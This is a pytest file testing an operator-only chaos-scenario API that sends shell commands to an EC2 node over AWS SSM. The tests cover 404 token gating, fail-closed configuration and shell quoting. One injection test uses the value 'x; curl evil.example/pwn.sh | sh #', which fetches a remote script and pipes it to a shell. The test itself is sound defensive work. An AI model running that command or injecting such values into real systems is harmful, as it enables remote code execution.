"""
Tests for app/routers/chaos_scenarios.py — the operator-triggered incident
scenario runner that DemoChaosPage.jsx drives as Sentinel's sole chaos
control surface (per the "no Citizen Service Chaos Portal" simplification).

This endpoint is deliberately its own auth boundary (a shared header token,
`_require_operator`, separate from the JWT-authenticated GUI API) since it
ultimately drives an SSM shell command on a real EC2 node — so these tests
focus on: the token gate never leaking a 403-vs-404 distinction that would
confirm the endpoint's existence to an unauthenticated caller, the
unconfigured/misconfigured paths failing closed rather than guessing, and
the AWS-facing calls being reached only for a real, allowlisted scenario id.
"""
from __future__ import annotations

import pytest

import app.routers.chaos_scenarios as chaos_scenarios


TOKEN = "test-chaos-token-123"


@pytest.fixture
def configured(monkeypatch):
    """Token set, AWS region + instance id present: the fully-configured
    path each non-auth test starts from."""
    monkeypatch.setattr(chaos_scenarios.settings, "chaos_admin_token", TOKEN)
    monkeypatch.setattr(chaos_scenarios.settings, "aws_region", "us-east-1")
    monkeypatch.setattr(
        chaos_scenarios.settings, "chaos_scenario_runner_instance_id", "i-0123456789abcdef0"
    )
    return chaos_scenarios.settings


@pytest.fixture
def fake_aws(monkeypatch, configured):
    """Replaces the router's `_aws()` factory with a stub AWSClient whose
    SSM calls are captured/scripted per test, so no real boto3/network call
    is ever reached."""

    class _FakeAWS:
        def __init__(self):
            self.sent: list[dict] = []
            self.send_result: str | Exception = "cmd-0001"
            self.invocation_result: dict | Exception = {"status": "Success"}

        async def send_shell_command(self, *, instance_id, commands, comment, timeout_seconds):
            self.sent.append(
                {
                    "instance_id": instance_id,
                    "commands": commands,
                    "comment": comment,
                    "timeout_seconds": timeout_seconds,
                }
            )
            if isinstance(self.send_result, Exception):
                raise self.send_result
            return self.send_result

        async def get_command_invocation(self, *, instance_id, command_id):
            if isinstance(self.invocation_result, Exception):
                raise self.invocation_result
            return {**self.invocation_result, "instance_id": instance_id, "command_id": command_id}

    fake = _FakeAWS()
    monkeypatch.setattr(chaos_scenarios, "_aws", lambda: fake)
    return fake


# ---------------------------------------------------------------------------
# Auth gate: `_require_operator` — a wrong/missing token must look exactly
# like a route that does not exist (404), never 401/403, on every endpoint.
# ---------------------------------------------------------------------------
def test_list_scenarios_with_no_token_configured_is_404(gui_client):
    client, _login = gui_client
    resp = client.get("/api/sentinel/chaos-scenarios", headers={"X-Chaos-Token": "anything"})
    assert resp.status_code == 404


def test_list_scenarios_with_missing_header_is_404(gui_client, configured):
    client, _login = gui_client
    resp = client.get("/api/sentinel/chaos-scenarios")
    assert resp.status_code == 404


def test_list_scenarios_with_wrong_token_is_404(gui_client, configured):
    client, _login = gui_client
    resp = client.get("/api/sentinel/chaos-scenarios", headers={"X-Chaos-Token": "not-it"})
    assert resp.status_code == 404


def test_run_scenario_with_wrong_token_is_404_and_never_reaches_aws(gui_client, fake_aws):
    client, _login = gui_client
    resp = client.post(
        "/api/sentinel/chaos-scenarios/db-outage/runs",
        headers={"X-Chaos-Token": "not-it"},
        json={},
    )
    assert resp.status_code == 404
    assert fake_aws.sent == []


def test_get_run_with_wrong_token_is_404(gui_client, configured):
    client, _login = gui_client
    resp = client.get(
        "/api/sentinel/chaos-scenarios/runs/cmd-0001", headers={"X-Chaos-Token": "not-it"}
    )
    assert resp.status_code == 404


# ---------------------------------------------------------------------------
# list_scenarios
# ---------------------------------------------------------------------------
def test_list_scenarios_reports_unconfigured_without_an_instance_id(gui_client, monkeypatch):
    monkeypatch.setattr(chaos_scenarios.settings, "chaos_admin_token", TOKEN)
    monkeypatch.setattr(chaos_scenarios.settings, "aws_region", "us-east-1")
    monkeypatch.setattr(chaos_scenarios.settings, "chaos_scenario_runner_instance_id", "")
    monkeypatch.setattr(chaos_scenarios.settings, "aws_ec2_instance_ids", "")
    client, _login = gui_client
    resp = client.get("/api/sentinel/chaos-scenarios", headers={"X-Chaos-Token": TOKEN})
    assert resp.status_code == 200
    body = resp.json()
    assert body["configured"] is False
    assert body["instance_id"] is None


def test_list_scenarios_returns_every_defined_scenario_including_the_suite_runner(
    gui_client, configured
):
    client, _login = gui_client
    resp = client.get("/api/sentinel/chaos-scenarios", headers={"X-Chaos-Token": TOKEN})
    assert resp.status_code == 200
    body = resp.json()
    assert body["configured"] is True
    ids = {s["id"] for s in body["scenarios"]}
    assert ids == set(chaos_scenarios.SCENARIOS.keys())
    assert "all" in ids
    # bad-deployment is the one scenario explicitly marked dangerous.
    bad_deployment = next(s for s in body["scenarios"] if s["id"] == "bad-deployment")
    assert bad_deployment["dangerous"] is True


# ---------------------------------------------------------------------------
# run_scenario
# ---------------------------------------------------------------------------
def test_run_scenario_rejects_an_unknown_scenario_id(gui_client, fake_aws):
    client, _login = gui_client
    resp = client.post(
        "/api/sentinel/chaos-scenarios/not-a-real-scenario/runs",
        headers={"X-Chaos-Token": TOKEN},
        json={},
    )
    assert resp.status_code == 404
    assert fake_aws.sent == []


def test_run_scenario_is_503_when_aws_is_not_configured(gui_client, monkeypatch):
    monkeypatch.setattr(chaos_scenarios.settings, "chaos_admin_token", TOKEN)
    monkeypatch.setattr(chaos_scenarios.settings, "aws_region", "")
    client, _login = gui_client
    resp = client.post(
        "/api/sentinel/chaos-scenarios/db-outage/runs",
        headers={"X-Chaos-Token": TOKEN},
        json={},
    )
    assert resp.status_code == 503


def test_run_scenario_happy_path_sends_exactly_one_ssm_command(gui_client, fake_aws):
    client, _login = gui_client

    resp = client.post(
        "/api/sentinel/chaos-scenarios/db-outage/runs",
        headers={"X-Chaos-Token": TOKEN},
        json={"namespace": "citizen-portal", "auto_rollback": True},
    )

    assert resp.status_code == 200
    body = resp.json()

    assert body == {
        "scenario": "db-outage",
        "instance_id": "i-0123456789abcdef0",
        "command_id": "cmd-0001",
        "status_url": "/api/sentinel/chaos-scenarios/runs/cmd-0001",
    }

    assert len(fake_aws.sent) == 1
    assert fake_aws.sent[0]["instance_id"] == "i-0123456789abcdef0"
    assert "db-outage" in fake_aws.sent[0]["commands"][0]

    assert fake_aws.sent[0]["commands"][0].startswith(
        "bash <<'SENTINEL_CHAOS_SCRIPT'\n"
    )
    assert "set -euo pipefail" in fake_aws.sent[0]["commands"][0]
    assert fake_aws.sent[0]["commands"][0].endswith(
        "\nSENTINEL_CHAOS_SCRIPT"
    )


def test_reset_all_sends_recovery_runner_command(gui_client, fake_aws):
    client, _login = gui_client

    resp = client.post(
        "/api/sentinel/chaos-scenarios/reset-all/runs",
        headers={"X-Chaos-Token": TOKEN},
        json={},
    )

    assert resp.status_code == 200
    assert resp.json()["scenario"] == "reset-all"
    assert len(fake_aws.sent) == 1
    assert "reset-all" in fake_aws.sent[0]["commands"][0]


def test_run_scenario_namespace_is_shell_quoted_against_injection(gui_client, fake_aws):
    """`namespace` is caller-supplied (unlike `scenario`, which is checked
    against the closed SCENARIOS dict) and ends up inside a shell script
    string sent to a real EC2 node over SSM — it must never be interpolated
    as anything but an inert quoted argument."""
    client, _login = gui_client
    resp = client.post(
        "/api/sentinel/chaos-scenarios/db-outage/runs",
        headers={"X-Chaos-Token": TOKEN},
        json={"namespace": "x; curl evil.example/pwn.sh | sh #"},
    )
    assert resp.status_code == 200
    sent_command = fake_aws.sent[0]["commands"][0]
    # The dangerous text must appear only inside a single-quoted shell
    # literal (shlex.quote's escaping), never as a bare, shell-interpretable
    # command separator.
    assert "'x; curl evil.example/pwn.sh | sh #'" in sent_command


def test_run_scenario_wraps_an_aws_failure_as_a_502(gui_client, fake_aws):
    fake_aws.send_result = RuntimeError("ssm unavailable")
    client, _login = gui_client
    resp = client.post(
        "/api/sentinel/chaos-scenarios/db-outage/runs",
        headers={"X-Chaos-Token": TOKEN},
        json={},
    )
    assert resp.status_code == 502


# ---------------------------------------------------------------------------
# get_run
# ---------------------------------------------------------------------------
def test_get_run_is_503_when_aws_is_not_configured(gui_client, monkeypatch):
    monkeypatch.setattr(chaos_scenarios.settings, "chaos_admin_token", TOKEN)
    monkeypatch.setattr(chaos_scenarios.settings, "aws_region", "")
    client, _login = gui_client
    resp = client.get(
        "/api/sentinel/chaos-scenarios/runs/cmd-0001", headers={"X-Chaos-Token": TOKEN}
    )
    assert resp.status_code == 503


def test_get_run_happy_path_returns_the_invocation_status(gui_client, fake_aws):
    fake_aws.invocation_result = {"status": "Success", "stdout": "ok", "stderr": ""}
    client, _login = gui_client
    resp = client.get(
        "/api/sentinel/chaos-scenarios/runs/cmd-0001", headers={"X-Chaos-Token": TOKEN}
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["status"] == "Success"
    assert body["command_id"] == "cmd-0001"


def test_get_run_wraps_an_aws_failure_as_a_502(gui_client, fake_aws):
    fake_aws.invocation_result = RuntimeError("command not found")
    client, _login = gui_client
    resp = client.get(
        "/api/sentinel/chaos-scenarios/runs/cmd-0001", headers={"X-Chaos-Token": TOKEN}
    )
    assert resp.status_code == 502
